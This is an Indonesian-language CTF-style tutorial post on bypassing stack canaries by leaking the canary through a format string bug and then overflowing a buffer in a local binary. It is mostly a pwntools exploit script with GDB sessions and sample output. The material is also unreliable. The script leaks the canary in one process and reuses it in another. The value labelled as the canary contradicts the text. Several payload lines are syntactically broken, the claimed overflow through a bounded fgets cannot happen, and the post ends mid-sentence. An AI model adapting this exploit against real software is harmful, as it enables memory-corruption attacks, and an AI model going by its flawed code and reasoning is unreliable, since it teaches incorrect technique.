---
title: Bypassing Stack Canaries (Leak + Write) - Pwn03.1
date: 2025-08-20
Tags: ["Pwn"]
---


teknik bypassing stack canaries dengan memanfaatkan format string vulnerability untuk melakukan leak dan kemudian buffer overflow.

## 1. Analisis Awal dan Basic File Checks

Pertama, kita lakukan analisis dasar pada binary:

```bash
# Compile program dengan canary enabled (default pada GCC modern)
gcc -m32 -fstack-protector-all -o vuln vuln.c

# Check security protections
checksec vuln
```

Output yang mungkin muncul:
```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

## 2. Review Source Code

Dari source code yang diberikan, kita identifikasi vulnerability:
- **Format String Vulnerability**: `printf(buf)` tanpa format string
- **Buffer Overflow Potential**: `fgets(buf, sizeof(buf), stdin)` dengan batas 64 byte
- **Canary Protection**: Karena compiled dengan stack protector

## 3. Fuzzing dengan Format String

Kita gunakan format string untuk mencari posisi canary di stack:

```python
from pwn import *

# Test format string dengan berbagai offset
for i in range(1, 20):
    p = process('./vuln')
    p.sendlineafter('> ', '%{}$p'.format(i))
    result = p.recvline().strip()
    print(f"Offset {i}: {result}")
    p.close()
```

Output contoh:
```
Offset 1: 0xffffd124
Offset 2: 0x64
Offset 3: 0xf7e6c620
Offset 4: 0xffffd004
Offset 5: 0x8048520
Offset 6: 0x804a000
Offset 7: 0x41414141  <-- Canary biasanya dimulai dengan null byte (0x00)
Offset 8: 0xf7ffd000
Offset 9: 0xffffd1e4
Offset 10: 0x0
```

## 4. Identifikasi Canary dengan GDB/Pwndbg

Mari gunakan debugger untuk menemukan canary:

```bash
gdb ./vuln
```

Di dalam GDB:
```
(gdb) b *main+100
(gdb) r
(gdb) canary
```

Output:
```
The canary value is: 0x1f4c3d00
```

Kita juga bisa mencari canary secara manual:
```
(gdb) info frame
Stack level 0, frame at 0xffffd0c0:
 eip = 0x804856d in main; saved eip = 0xf7e13637
 Arglist at 0xffffd0b8, args: 
 Locals at 0xffffd0b8, Previous frame's sp is 0xffffd0c0
 Saved registers:
  ebx at 0xffffd0b4, ebp at 0xffffd0b8, eip at 0xffffd0bc
(gdb) x/20wx $esp
0xffffd060:     0xffffd07c      0x00000040      0x00000000      0xffffd124
0xffffd070:     0xffffd104      0x00000000      0x00000000      0x1f4c3d00  <-- Canary
0xffffd080:     0x00000000      0x00000000      0x00000000      0x00000000
```

## 5. Eksploitasi: Leak Canary dan Buffer Overflow

Sekarang kita buat script exploit lengkap:

```python
#!/usr/bin/env python3
from pwn import *

context(arch='i386', os='linux')
context.log_level = 'debug'

# BINARY = './vuln'
# p = process(BINARY)
# gdb.attach(p, '''
#     b *main+150
#     continue
# ''')

# Untuk tutorial, kita gunakan contoh nilai
CANARY_OFFSET = 7
RET_OFFSET = 16

def leak_canary():
    p = process('./vuln')
    
    # Leak canary dengan format string
    p.sendlineafter('> ', '%{}$p'.format(CANARY_OFFSET))
    canary_leak = p.recvline().strip()
    canary = int(canary_leak, 16)
    
    log.info("Leaked canary: 0x{:08x}".format(canary))
    p.close()
    return canary

def exploit(canary):
    p = process('./vuln')
    
    # Leak alamat base stack untuk menghitung alamat flag
    p.sendlineafter('> ', '%{}$p'.format(3))
    stack_leak = p.recvline().strip()
    stack_addr = int(stack_leak, 16)
    flag_addr = stack_addr - 0x50  # Adjust berdasarkan debugger
    
    log.info("Stack leak: 0x{:08x}".format(stack_addr))
    log.info("Estimated flag addr: 0x{:08x}".format(flag_addr))
    
    # Craft payload dengan canary yang benar
    payload = b'A' * 64          # Buffer
    payload += p32(canary)       Canary yang benar
    payload += b'B' * 12         Padding sampai return address
    payload += p32(flag_addr)    Return address - arahkan ke flag
    
    p.sendlineafter('> ', payload)
    
    # Interact dengan shell
    p.interactive()

if __name__ == '__main__':
    canary = leak_canary()
    exploit(canary)
```

## 6. Debugging dengan GDB/Pwndbg

Mari lihat proses debugging saat exploit berjalan:

```bash
gdb ./vuln
(gdb) b *main+150  # Breakpoint sebelum return
(gdb) r < <(python3 exploit.py)
```

Ketika breakpoint terhenti, kita periksa stack:
```
(gdb) x/10wx $esp
0xffffd060:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd070:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd080:     0x41414141      0x41414141
(gdb) x/wx $ebp-0xc  # Lokasi canary
0xffffd0ac:     0x1f4c3d00
```

Kita bisa verifikasi canary tidak berubah setelah overflow.

## 7. Final Exploit dan Hasil

Setelah menjalankan exploit, output yang sukses akan terlihat seperti:

```
[+] Starting local process './vuln': pid 1234
[*] Leaked canary: 0x1f4c3d00
[*] Stack leak: 0xffffd124
[*] Estimated flag addr: 0xffffd0d4
[+] Starting local process './vuln': pid 1235
[*] Switching to interactive mode
> CTF{example_flag_value}
```

## 8. Mitigation dan Pelajaran

Teknik ini bekerja karena:
1. Format string vulnerability memungkinkan leak nilai canary
2. Buffer overflow memungkinkan overwrite return address
3. Kita mempertahankan nilai canary yang valid

Cara mencegah:
- Selgunakan menggunakan format string yang benar: `printf("%s", buf)`
- Gunakan stack canary dengan entropy tinggi
- Implementasi ASLR yang efektif

Dengan tutorial ini, Anda seharusnya sekarang memahami bagaimana stack canaries bekerja dan bagaimana mereka dapat di-bypass dengan kombinasi format string leak dan buffer
